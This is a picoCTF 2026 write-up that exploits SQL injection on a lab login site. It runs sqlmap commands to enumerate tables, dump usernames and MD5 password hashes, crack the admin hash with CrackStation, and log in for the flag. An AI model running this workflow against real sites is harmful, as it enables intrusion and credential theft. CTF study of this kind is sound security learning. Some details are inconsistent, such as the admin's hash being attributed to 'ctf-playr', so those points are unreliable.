---
title: "picoCTF 2026 — SqlMap1"
date: 2026-03-01
tags: [web, sqli, sqlmap, picoctf]
ctf: "picoCTF 2026"
summary: "sqlmap-assisted exploitation of a login form with legacy MD5 hashing — extract the admin hash, crack it, and authenticate to retrieve the flag."
draft: false
---

**Author of challenge:** Aditya Sudhansu

## Challenge Description

> You've been hired by a shadowy group of pentesters who love a good puzzle. The system looks ordinary, but appearances lie. Somewhere inside, sloppy code and legacy hashing practices left a tiny, perfect doorway for an attacker. Your mission — should you choose to accept it — is to slip through that doorway, act as a legit user and retrieve the secret flag.

Login credentials given: `test:test`

---

## 1. Recon

Logging in with `test:test` reveals a "Vulnerable Flag Search" page with a single search box. This matched the challenge's first hint directly:

> *"Search box looks interesting."*

Submitting a search returned a GET request against `vuln.php`:

```
GET /vuln.php?q=test&PHPSESSID=<session_id> HTTP/1.1
Cookie: PHPSESSID=<session_id>
```

Two things stood out immediately:

1. The `q` parameter is reflected into a SQL query used to search a `flags` table.
2. The session ID is passed **twice**  once as a cookie, once as a GET parameter — which is unusual and worth keeping consistent in any tooling used against the endpoint.

Testing the search box with generic keywords returned several entries, but almost all of them were decoys — a `flags` table seeded with junk like `n0T_F0uNd_...` and a repeated fake string `tH15_lS_n0T_f!@G_...` under multiple aliases (`suspicious`, `ctf-player`, `malicious`, etc.). This is a common CTF trick to punish attackers who blindly dump the first table they find without further recon — the real flag lives elsewhere, tied to a specific user account.

---

## 2. Confirming SQL Injection

A single quote (`'`) submitted in the search box altered the query's behavior, confirming classic SQL injection on the `q` parameter. Since the backend turned out to be **SQLite** (not MySQL/Postgres), the exploitation path differs slightly from typical tutorials   notably, SQLite has no concept of multiple databases, so `--dbs` in sqlmap doesn't apply here; only `--tables` does.

---

## 3. Automating Exploitation with sqlmap

[sqlmap](https://sqlmap.org/) is an open-source penetration testing tool that automates detecting and exploiting SQL injection vulnerabilities, and can take over database servers. Instead of manually crafting boolean/time-based payloads and parsing responses one bit at a time, sqlmap automates the entire process: injection detection, DBMS fingerprinting, and data extraction (tables, columns, rows).

### 3.1 Detecting the injection

```bash
sqlmap -u "http://lonely-island.picoctf.net:54932/vuln.php?q=test&PHPSESSID=<session_id>" \
  --cookie="PHPSESSID=<session_id>" \
  -p q \
  --batch --dbs
```

**Flag reference:**

 `-u`  Target URL, including a dummy value for the parameter to be tested |
`--cookie` Passes the session cookie so sqlmap hits the endpoint as an authenticated user |
 `-p q`  Restricts testing to the `q` parameter specifically (prevents sqlmap from wasting time fuzzing `PHPSESSID`, which is not the vulnerable one) |
 `--batch` Auto-accepts sqlmap's default answer to any interactive prompt, so the scan runs unattended |
|`--dbs` Attempts to list all databases on the backend 

**Result:**
sqlmap identified the parameter as injectable via two techniques:
- **Boolean-based blind** (SQLite `CASE WHEN ... THEN ... ELSE JSON(...)` construct)
- **Time-based blind** (heavy `RANDOMBLOB` query)

It also correctly fingerprinted the backend as **SQLite**, and warned that `--dbs` isn't meaningful for SQLite — use `--tables` instead:

```
[WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
```

### 3.2 Restricting technique to boolean-based blind

The default scan mixes boolean-based and time-based techniques. The time-based payload used a huge `RANDOMBLOB(500000000/2)` to force a measurable delay  but against this particular (rate-limited/unstable) instance, it caused repeated connection failures:

```
[CRITICAL] considerable lagging has been detected in connection response(s)
[CRITICAL] unable to connect to the target URL
```

To avoid this, the technique was restricted to boolean-based blind only, which is lighter weight and doesn't rely on server-side delays:

```bash
sqlmap -u "http://lonely-island.picoctf.net:64264/vuln.php?q=q&PHPSESSID=<session_id>" \
  --cookie="PHPSESSID=<session_id>" \
  -p q --batch --technique=B --hex --flush-session --tables
```

`sqlite_sequence` is an internal SQLite bookkeeping table (auto-created for `AUTOINCREMENT` columns) and irrelevant here. `flags` is the decoy table already explored manually. **`users`** is the real target.

### 3.3 Enumerating columns of `users`

```bash
sqlmap -u "http://lonely-island.picoctf.net:60275/vuln.php?q=q&PHPSESSID=<session_id>" \
  --cookie="PHPSESSID=<session_id>" \
  -p q --batch --technique=B --hex \
  -D SQLite_masterdb -T users --columns
```

### 3.4 Dumping credentials

```bash
sqlmap -u "http://lonely-island.picoctf.net:61847/vuln.php?q=q&PHPSESSID=<session_id>" \
  --cookie="PHPSESSID=<session_id>" \
  -p q --batch --technique=B --hex \
  -D SQLite_masterdb -T users -C username,password --dump
```


**Result (partial dump — instance connection degraded mid-scan):**
```
+------------+----------------------------------+
| username   | password                         |
+------------+----------------------------------+
| admin      | 7a67ab5872843b22b5e14511867c4e43 |
| ctf-player | 83806b490e28a7f8e6662646cbdbff1a |
| ghost      | eb1f3ba6901c65d9b2e09a38f560758b |
| ...        | a669d60c31ad3d05b9e453c8576c7aab |
+------------+----------------------------------+
```

The target account is clearly **ctf-playr**, holding the MD5 hash `7a67ab5872843b22b5e14511867c4e43`.

---

## 4. Hint #2 and #3

> *"Passwords should not be stored in md5 format."*
> *"CrackStation is a great online tool for cracking hashes."*

MD5 is a fast, unsalted cryptographic hash never intended for password storage. Because it's unsalted and computationally cheap, precomputed rainbow tables (like those powering [CrackStation](https://crackstation.net/)) can reverse common passwords from their hash almost instantly. This is exactly the "sloppy... legacy hashing practices" the challenge description warned about.

Submitting `7a67ab5872843b22b5e14511867c4e43` to CrackStation returned the plaintext password

---

## 5. Logging in as Admin

Using the recovered credentials on the normal login form (not sqlmap):

```
username: admin
password: <cracked plaintext>
```

Logging in as `admin` exposed the real flag  the earlier "flags" table entries were all decoys designed to catch attackers who dumped data without pivoting to the actual privileged account.
